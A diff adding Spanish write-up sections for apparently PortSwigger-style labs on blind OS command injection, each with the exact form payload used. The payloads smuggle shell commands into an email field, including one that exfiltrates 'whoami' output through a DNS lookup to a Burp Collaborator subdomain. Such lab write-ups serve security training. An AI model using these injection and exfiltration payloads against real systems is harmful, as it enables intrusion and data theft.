@@ -66,4 +66,31 @@ Luego accedemos a ese archivo a través del sistema de carga de imágenes, logra
 csrf=EI53BjEDDInZex7QqNGan3PzJ7bE0xCb&name=test&email=carlos@cambiado.com;whoami > /var/www/images/test.txt;&subject=afasdf&message=afasdfasdfa
 ```
 
+## Reto 4: Inyección ciega de comandos del sistema operativo con interacción fuera de banda
 
+
+Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.
+
+La aplicación ejecuta un comando de shell que contiene la información proporcionada por el usuario. El comando se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. No es posible redirigir la salida a una ubicación accesible. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.
+
+Para resolver el laboratorio, explote la vulnerabilidad de inyección de comandos ciegos del sistema operativo para emitir una búsqueda DNS a Burp Collaborator. 
+
+abordamos una inyección de comandos ciega en la que no obtenemos ninguna respuesta visible ni podemos redirigir la salida. Para comprobar la ejecución del comando, usamos una técnica fuera de banda (OAST) enviando una consulta DNS hacia un subdominio de Burp Collaborator.
+
+```
+csrf=B0jIrj5VjuPE7aI2DGyECMLk9syNJMil&name=test&email=test%40test.com;nslookup x.a0bvl5hbnm50i3m6ss4tx82m0d64uuij.oastify.com ;&subject=afasdf&message=asdfadfasdf
+```
+
+## Reto 5: Inyección ciega de comandos del sistema operativo con exfiltración de datos fuera de banda
+
+Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.
+
+La aplicación ejecuta un comando de shell que contiene la información proporcionada por el usuario. El comando se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. No es posible redirigir la salida a una ubicación accesible. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.
+
+Para resolver el laboratorio, ejecute el whoamiComando y exfiltrar la salida mediante una consulta DNS a Burp Collaborator. Deberá ingresar el nombre del usuario actual para completar el laboratorio. 
+
+Una inyección de comandos ciega aprovechando una técnica avanzada de exfiltración de datos mediante consultas DNS a un dominio controlado. Usamos Burp Collaborator para lanzar un ‘whoami‘ y capturar el resultado directamente en el subdominio generado, demostrando cómo extraer información sensible incluso cuando no hay salida directa del comando.
+
+```
+csrf=zf4btby0GytYneIS7bK30CWwifOBprk0&name=test&email=test@test.com;nslookup $(whoami).457pqzm5sgaunxr0xm9n227g57byzpne.oastify.com;&subject=afasdf&message=asdfasdfa
+```
